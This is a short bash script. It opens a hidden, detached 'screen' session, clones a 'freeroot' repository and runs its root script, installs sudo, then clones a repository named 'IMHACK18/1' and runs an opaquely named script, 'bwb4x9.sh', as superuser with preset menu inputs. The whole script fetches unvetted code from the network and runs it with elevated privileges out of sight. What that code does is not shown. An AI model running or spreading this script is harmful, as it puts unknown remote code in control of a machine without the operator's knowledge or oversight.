#!/bin/bash
screen -dmS ipx bash -c "
  git clone https://github.com/foxytouxxx/freeroot;
  cd freeroot;
  chmod +x *;
  echo yes | ./root.sh;
  apt update;
  apt install -y sudo;
  sudo apt install -y git;
  git clone https://github.com/IMHACK18/1.git;
  cd 1;
  chmod +x bwb4x9.sh;
  (echo 6; echo 44) | sudo sh bwb4x9.sh
"
